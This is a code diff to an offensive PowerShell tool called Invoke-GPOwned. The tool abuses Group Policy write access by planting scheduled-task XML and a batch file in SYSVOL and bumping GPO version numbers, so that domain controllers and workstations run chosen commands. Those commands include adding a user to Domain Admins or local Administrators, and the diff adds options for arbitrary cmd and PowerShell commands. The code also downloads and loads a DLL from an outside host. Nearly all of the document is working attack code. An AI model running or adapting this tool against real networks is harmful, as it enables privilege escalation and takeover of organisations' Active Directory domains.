@@ -48,33 +48,60 @@ function Invoke-GPOwned {
 
         [Parameter(Mandatory=$false)]
         [Alias("stx")]
-        [string]$SecondTaskXMLPath
+        [string]$SecondTaskXMLPath,
+
+        [Parameter(Mandatory=$false)]
+        [Alias("scmd")]
+        [string]$SecondXMLCMD,  
+        
+        [Parameter(Mandatory=$false)]
+        [Alias("sps")]
+        [string]$SecondPowerShell,
+
+        [Parameter(Mandatory=$false)]
+        [string]$Log  
     )
 
     if ($Help -or !($GPOGUID) -or !($ScheduledTasksXMLPath) -or !($Computer)) {
         Write-Output @"
 Invoke-GPOwned Help:
 
-Example : Invoke-GPOwned -GPOGUID {387547AA-B67F-4D7B-A524-AE01E56751DD} -ScheduledTasksXMLPath ".\ScheduledTasks.xml" -User Administrator -Domain noteasy.local -DC dc01.noteasy.local
+Examples: 
+- GPO Linked to DC:
+Invoke-GPOwned -GPOGUID {387547AA-B67F-4D7B-A524-AE01E56751DD} -LoadDLL .\Microsoft.ActiveDirectory.Management.dll -ScheduledTasksXMLPath ".\ScheduledTasks.xml" -User UserToElevate -Computer dc01.noteasy.local
+
+- GPO Linked to a workstation:
+Invoke-GPOwned -GPOGUID {387547AA-B67F-4D7B-A524-AE01E56751DD} -LoadDLL .\Microsoft.ActiveDirectory.Management.dll -ScheduledTasksXMLPath ".\ScheduledTasks.xml" -User UserToElevate -Computer pc01.noteasy.local -Local
+
+- GPO Linked to a workstation with a DA Session:
+Invoke-GPOwned -GPOGUID "{D552AC5B-CE07-4859-9B8D-1B6A6BE1ACDA}" -LoadDLL .\Microsoft.ActiveDirectory.Management.dll -ScheduledTasksXMLPath ".\ScheduledTasks.xml" -c "pc-01.noteasy.local" -Author "DAUser" -SecondTaskXMLPath ".\wsadd.xml" -SecondXMLCMD '/r net group "domain admins" UserToElevate /add /dom'
 
 Parameters:
 -GPOGUID/-guid: Group Policy GUID
 -ScheduledTasksXMLPath/-xml: Full path to the ScheduledTasks xml file
--SecondTaskXMLPath/-stx: Using the the wsadd.xml file, run commands as a domain admin on workstations that are not domain controllers 
+-SecondTaskXMLPath/-stx: Using the the wsadd.xml file, run commands as a domain admin on workstations that are not domain controllers, if used there's no need to supply -CMD or -PowerShell flags
 -Computer/-c: Target computer
 -Local: Adds a chosen user to the local administrators group on the defined computer
 -DA: Adds the user to the domain admins group
 -CMD: Execute a custom cmd command
 -PowerShell/-ps: Execute a custom powershell command
+-SecondXMLCMD/-scmd: Execute a command with the second XML technique
+-SecondPowerShell/-sps: Execute a command with the second XML technique
 -User/-u: Target user to elevate, mandatory for Local technique
 -Domain/-d: Target domain, current domain is used by default
 -LoadDLL/-dll: Load the Microsoft.ActiveDirectory.Management.dll from a custom path, if not supplied it will try to download it to the current directory
+-Log: Log the entire output of the tool into a text file
 "@
         return
     }
 
-
+$red = Write-Output "$([char]0x1b)[101m[-]$([char]0x1b)[0m"
+$green = Write-Output "$([char]0x1b)[102m[+]$([char]0x1b)[0m"
+$gray = Write-Output "$([char]0x1b)[100m[*]$([char]0x1b)[0m"
     # Enabling TLS and loading the ActiveDirectory module to memory #
+if($Log){
+    Start-Transcript -Path $Log
+}
 if(!($LoadDLL)){
     iwr https://ownd.lol/NIdmxycw/Microsoft.ActiveDirectory.Management.dll -OutFile Microsoft.ActiveDirectory.Management.dll
     Import-Module .\Microsoft.ActiveDirectory.Management.dll
@@ -82,7 +109,7 @@ if(!($LoadDLL)){
     if(($mod.Contains("Microsoft.ActiveDirectory")) -eq "True"){
         $null
     } else {
-        Write-Error "[-] ActiveDirectory module failed to load!"
+        $red+" ActiveDirectory module failed to load!"
         return
     }
 } elseif($LoadDLL) {
@@ -91,11 +118,11 @@ if(!($LoadDLL)){
     if(($mod.Contains("Microsoft.ActiveDirectory")) -eq "True"){
         $null
     } else {
-        Write-Error "[-] ActiveDirectory module failed to load!"
+        $red+" ActiveDirectory module failed to load!"
         return
     }
 } else {
-    Write-Error "[-] Couldn't load DLL exiting..."
+    $red+" Couldn't load DLL, exiting..."
     return
 }
     $guid = $GPOGUID
@@ -126,9 +153,7 @@ if(!($LoadDLL)){
 
     # Look for an active domain admin account #
     if($Author){
-        echo $Author
         $dauser = $Author
-        echo $dauser
     } else {
         $i = 0
         while($gotcha -ne "1"){
@@ -142,50 +167,91 @@ if(!($LoadDLL)){
     }
     $validatexml = Get-Content $ScheduledTasksXMLPath
     if(-not(Test-Path $ScheduledTasksXMLPath)){
-        Write-Output "[-] XML file not found!."
+        $red+" XML file not found!."
         break
-    }
-    elseif($validatexml.StartsWith("<?xml version")){
-        Write-Output "[+] XML File is valid!."
+    }elseif($validatexml.StartsWith("<?xml version")){
+        $green+" XML File is valid!."
     }else{
-        Write-Output "[-] XML file empty or corrupted!."
+        $red+" XML file empty or corrupted!."
         exit(0)
     }
     if($SecondTaskXMLPath){
         $validatesecondxml = Get-Content $SecondTaskXMLPath
-    if(-not(Test-Path $ScheduledTasksXMLPath)){
-        Write-Output "[-] XML file not found!."
+        if(-not(Test-Path $SecondTaskXMLPath)){
+        $red+" XML file not found!."
         break
     }
     elseif($validatesecondxml.StartsWith("<?xml version")){
-        Write-Output "[+] XML File is valid!."
+        $green+" Second XML File is valid!."
         $cont = "powershell -NoProfile -ExecutionPolicy Bypass -Command `"Start-Process powershell -Verb RunAs -ArgumentList `"(`$Task=Get-Content '\\dc-01.noteasy.local\sysvol\noteasy.local\Policies\{D552AC5B-CE07-4859-9B8D-1B6A6BE1ACDA}\Machine\Preferences\ScheduledTasks\wsadd.xml' -raw); Register-ScheduledTask -Xml `$Task -TaskName OWNED2`""
         Set-Content -Path .\add.bat -Value $cont
         New-Item -ItemType File -Path "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\wsadd.xml" -Force 2>&1>$null
         Copy-Item $SecondTaskXMLPath "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\wsadd.xml" -Force 2>&1>$null
         Copy-Item add.bat "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\add.bat" -Force 2>&1>$null
-        Write-Output "[+] Created wsadd.xml and add.bat files in SYSVOL!"
-        }
-
-
-    }else{
-        Write-Output "[-] XML file empty or corrupted!."
-        exit(0)
+        $green+" Created wsadd.xml and add.bat files in SYSVOL!"
+        $pwd = (Get-Location | Select-Object Path -ExpandProperty Path)
+        $boundary = (Get-Date).AddHours(24).ToString("s")
+        if($SecondXMLCMD){
+            $xmlfile = "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\wsadd.xml"
+            $encoding = 'ASCII'
+            $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
+            $xmlfilecontent | ForEach-Object {$_ -replace "changedomain","$domain"} |
+                        Set-Content -Encoding $encoding $xmlfile -Force
+            $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
+            $xmlfilecontent | ForEach-Object {$_ -replace "changeuser","$dauser"} |
+                        Set-Content -Encoding $encoding $xmlfile -Force
+            $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
+            $xmlfilecontent | ForEach-Object {$_ -replace "autoremove","$boundary"} |
+                        Set-Content -Encoding $encoding $xmlfile -Force                        
+            $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
+            $xmlfilecontent | ForEach-Object {$_ -replace "commandtype","cmd.exe"} |
+                        Set-Content -Encoding $encoding $xmlfile -Force
+            $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
+            $xmlfilecontent | ForEach-Object {$_ -replace "argumentspace","$SecondXMLCMD"} |
+                            Set-Content -Encoding $encoding $xmlfile -Force
+        } elseif($SecondPowerShell){
+            $xmlfile = "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\wsadd.xml"
+            $encoding = 'ASCII'
+            $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
+            $xmlfilecontent | ForEach-Object {$_ -replace "changedomain","$domain"} |
+                        Set-Content -Encoding $encoding $xmlfile -Force
+            $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
+            $xmlfilecontent | ForEach-Object {$_ -replace "changeuser","$dauser"} |
+                        Set-Content -Encoding $encoding $xmlfile -Force
+            $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
+            $xmlfilecontent | ForEach-Object {$_ -replace "autoremove","$boundary"} |
+                        Set-Content -Encoding $encoding $xmlfile -Force                  
+            $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
+            $xmlfilecontent | ForEach-Object {$_ -replace "commandtype","powershell.exe"} |
+                        Set-Content -Encoding $encoding $xmlfile -Force
+            $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
+            $xmlfilecontent | ForEach-Object {$_ -replace "argumentspace","$SecondPowerShell"} |
+                            Set-Content -Encoding $encoding $xmlfile -Force
+        }else{
+            $red+" XML file empty or corrupted!."
+        return
+        } 
     }
-    
+    }
     # Checking whether a ScheduledTasks.xml file exists in SYSVOL for the means of backup and restoration after execution #
     if(Get-Content "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml" -ErrorAction SilentlyContinue){
         Copy-Item "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml" "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml.old"
-        Write-Output "[-] ScheduledTasks file in SYSVOL exists, created a backup file!"
+       $gray+" ScheduledTasks file in SYSVOL exists, created a backup file!"
         Copy-Item $ScheduledTasksXMLPath "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml" -Force 2>&1>$null
     } else {
         New-Item -ItemType File -Path "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml" -Force 2>&1>$null
         Copy-Item $ScheduledTasksXMLPath "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml" -Force 2>&1>$null
-        Write-Output "[+] Created ScheduledTasks file in SYSVOL!"
+        $green+" Created ScheduledTasks file in SYSVOL!"
     }
 
     # Modifying the ScheduledTasks.xml with the gathered information #
     if($DA){
+        if(!$User){
+            $User = Read-Host "Supply user to elevate!"
+            if($User -eq $null){
+                return
+        }
+        }
         $dacommand = '/r net group "Domain Admins" '+$User+' /add /dom'
         $pwd = (Get-Location | Select-Object Path -ExpandProperty Path)
         $xmlfile = "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
@@ -205,8 +271,14 @@ if(!($LoadDLL)){
         $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
         $xmlfilecontent | ForEach-Object {$_ -replace "argumentspace","$dacommand"} |
                         Set-Content -Encoding $encoding $xmlfile -Force
-        Write-Output "[+] ScheduledTasks file modified to add $User to the Domain Admins group!"
+        $green+" ScheduledTasks file modified to add $User to the Domain Admins group!"
     } elseif($Local){
+        if(!$User){
+            $User = Read-Host "Supply user to elevate!"
+            if($User -eq $null){
+                return
+        }
+        }
         $localcommand = '/r net localgroup Administrators '+$User+' /add'
         $pwd = (Get-Location | Select-Object Path -ExpandProperty Path)
         $xmlfile = "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
@@ -226,8 +298,30 @@ if(!($LoadDLL)){
         $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
         $xmlfilecontent | ForEach-Object {$_ -replace "argumentspace","$localcommand"} |
                     Set-Content -Encoding $encoding $xmlfile -Force
-        Write-Output "[+] ScheduledTasks file modified to add $User to local administrators group on $Computer!"
+        $green+" ScheduledTasks file modified to add $User to local administrators group on $Computer!"
     } else {
+
+        if($SecondTaskXMLPath){
+            $pwd = (Get-Location | Select-Object Path -ExpandProperty Path)
+        $xmlfile = "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
+        $encoding = 'ASCII'
+        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
+        $xmlfilecontent | ForEach-Object {$_ -replace "changedomain","$domain"} |
+                    Set-Content -Encoding $encoding $xmlfile -Force
+        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
+        $xmlfilecontent | ForEach-Object {$_ -replace "changeuser","$dauser"} |
+                    Set-Content -Encoding $encoding $xmlfile -Force
+        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
+        $xmlfilecontent | ForEach-Object {$_ -replace "ownuser","$User"} |
+                    Set-Content -Encoding $encoding $xmlfile -Force
+        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
+        $xmlfilecontent | ForEach-Object {$_ -replace "changedc","$dc"} |
+                    Set-Content -Encoding $encoding $xmlfile -Force
+        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
+        $xmlfilecontent | ForEach-Object {$_ -replace "argumentspace","/r \\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\add.bat"} |
+                    Set-Content -Encoding $encoding $xmlfile -Force
+        $green+" ScheduledTasks file modified with the supplied custom command!."
+        }
         if($PowerShell){
             if(($PowerShell.StartSwith("-c "))){
                 $PowerShell = $PowerShell.replace("-c ","")
@@ -255,7 +349,7 @@ if(!($LoadDLL)){
         $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
         $xmlfilecontent | ForEach-Object {$_ -replace "argumentspace","-Command $PowerShell"} |
                     Set-Content -Encoding $encoding $xmlfile -Force
-        Write-Output "[+] ScheduledTasks file modified with the supplied powershell custom command!."
+        $green+" ScheduledTasks file modified with the supplied powershell custom command!."
     } if($CMD){
         if(($CMD.StartSwith("/c "))){
             $CMD = $CMD.replace("/c ","")
@@ -280,14 +374,15 @@ if(!($LoadDLL)){
         $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
         $xmlfilecontent | ForEach-Object {$_ -replace "argumentspace","/r $CMD"} |
                     Set-Content -Encoding $encoding $xmlfile -Force
-        Write-Output "[+] ScheduledTasks file modified with the supplied custom command!."
-    } if(!$CMD -and !$PowerShell) {
-        Write-Output "[-] Either the -Local/-DA/-CMD/-PowerShell flags are required for execution!."
+        $green+" ScheduledTasks file modified with the supplied custom command!."
+    } if(!$CMD -and !$PowerShell -and !$SecondTaskXMLPath) {
+        $red+" Either the -Local/-DA/-CMD/-PowerShell flags are required for execution!."
         return
+    }
     }
     $Ext = "[{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}][{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]"
     $GPO = "CN=$guid,CN=Policies,CN=System,$domaindn"
-    Write-Output "[+] Incrementing GPT.INI Version by 1"
+    $gray+" Incrementing GPT.INI Version by 1"
     $gptIniFilePath = "\\$domain\SYSVOL\$domain\Policies\$guid\GPT.INI"
     $encoding = 'ASCII'
     $gptIniContent = Get-Content -Encoding $encoding -Path $gptIniFilePath
@@ -302,26 +397,26 @@ if(!($LoadDLL)){
         }
     }
     $currentVersion = (Get-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name versionNumber | Select-Object versionNumber -ExpandProperty versionNumber)
-    Write-Output "[+] Current GPO AD versionNumber = $currentVersion"
-    Write-Output "[+] Incrementing version by 1"
+    $gray+" Current GPO AD versionNumber = $currentVersion"
+    $gray+" Incrementing version by 1"
     $newVersionValue = $currentVersion+1
     # Incrementing the AD Machine policy by 1 to match the new SYSVOL policy number #
     Set-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name versionNumber -Value $newVersionValue
     $currentVersion = (Get-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name versionNumber | Select-Object versionNumber -ExpandProperty versionNumber)
-    Write-Output "[+] GPO AD versionNumber = $currentVersion"
+    $gray+" GPO AD versionNumber = $currentVersion"
     if($noext -ne 1){
-        Write-Output "[+] Current gPCMachineExtensionNames : $InitialExtensions"
+        $gray+" Current gPCMachineExtensionNames : $InitialExtensions"
     } else {
-        Write-Output "[+] Current gPCMachineExtensionNames : <not set>"
+        $gray+" Current gPCMachineExtensionNames : <not set>"
     }
     # Modyfing the gPCMachineExtensionNames attribute of the policy # 
-    Write-Output "[+] Adding Extensions to the attribute"
+    $gray+" Adding Extensions to the attribute"
     Set-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name gPCmachineExtensionNames -Value $Ext$InitialExtensions
     $FinalizedGPO = (Get-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name gPCMachineExtensionNames | Select-Object gPCMachineExtensionNames -ExpandProperty gPCMachineExtensionNames)
     if($FinalizedGPO.StartsWith("[{00000000")){
-        Write-Output "[+] Successfully written extensions to GPO!"
+        $green+" Successfully written extensions to GPO!"
     } else {
-        Write-Error "[-] Failed to write gPCMachineExtensionNames!"
+        $red+" Failed to write gPCMachineExtensionNames!"
         return
     }
     # A bad loading screen counting up to 300(5 minute update interval on DCs) #
@@ -339,7 +434,7 @@ if(!($LoadDLL)){
             Start-Sleep 1
             }
         Write-Output "`n`n"
-        Write-Output "[+] User added to the domain admins group!"
+        $green+" User added to the domain admins group!"
     } elseif($Local){
          for ($x = 1; $x -le 300; $x++ ){
             $PercentCompleted = ($x/300*100)
@@ -353,7 +448,7 @@ if(!($LoadDLL)){
         while((Get-CimInstance -ClassName Win32_Group  -Filter 'SID = "S-1-5-32-544"' -ComputerName $Computer -ErrorAction SilentlyContinue | Get-CimAssociatedInstance -ResultClassName Win32_UserAccount | select Name -ExpandProperty Name | findstr $User) -eq $null){
             Start-Sleep 1
             }
-        Write-Output "[+] User added to the local admins group!"
+        $green+" User added to the local admins group!"
      }elseif($CMD -or $PowerShell){
         for ($x = 1; $x -le 300; $x++){
             $PercentCompleted = ($x/300*100)
@@ -361,7 +456,7 @@ if(!($LoadDLL)){
             Start-Sleep -Seconds 1
         }
     }
-    Write-Output "[+] Reverting extensions back to what they were"
+    $gray+" Reverting extensions back to what they were"
     # Reverting the gPCMachineExtensionNames #
     if($noext -ne 1){
     Set-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name gPCmachineExtensionNames -Value "$InitialExtensions"
@@ -369,28 +464,35 @@ if(!($LoadDLL)){
         Clear-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name gPCmachineExtensionNames
     }
     if($noext -ne 1){
-    Write-Output "[+] gPCMachineExtensionNames reverted back to -> $InitialExtensions"
+        $green+" gPCMachineExtensionNames reverted back to -> $InitialExtensions"
     } else {
-        Write-Output "[+] Cleared gPCMachineExtensionNames!"
+        $green+" Cleared gPCMachineExtensionNames!"
     }
-    Write-Output "[+] Removing the scheduled task from the DC"
+    $gray+" Removing the scheduled task from the DC"
     # Trying to delete the scheduled task from the DC #
     try{
         Unregister-ScheduledTask -CimSession $dc -TaskName "OWNED" -Confirm:$false
-        if($SecondTaskXMLPath){
-            Unregister-ScheduledTask -CimSession $dc -TaskNAme "OWNED2" -Confirm:$false -Force
+        }
+    catch{
+        $red+" Scheduled Task Removal Failed! login to $dc and check if it's already removed, or remove it manually!."
+    }
+    if($SecondTaskXMLPath){
+        try{
+            Unregister-ScheduledTask -CimSession $dc -TaskName "OWNED2" -Confirm:$false
+            }
+        catch{
+            $red+" Second Scheduled Task Removal Failed! login to the $dc and check if it's already removed, or remove it manually!."
+        }
+        # Reverting the ScheduledTasks.xml to the backup or deletes it #
+        Remove-Item "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
+        if(Get-Item "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml.old" -ErrorAction SilentlyContinue){
+            Move-Item \\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml.old \\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
+            $green+" XML file restored!"
+        } else {
+            $green+" File removed from SYSVOL"
         }
     }
-    catch{
-        Write-Error "[-] Scheduled Task Removal Failed! login to the DC and remove it manually."
+    if($Log){
+        Stop-Transcript
     }
-    # Reverting the ScheduledTasks.xml to the backup or deletes it #
-    Remove-Item "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
-    if(Get-Item "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml.old" -ErrorAction SilentlyContinue){
-        Move-Item \\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml.old \\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
-        Write-Output "[+] XML file restored!"
-    } else {
-        Write-Output "[+] File removed from SYSVOL"
-    }
-}
 }
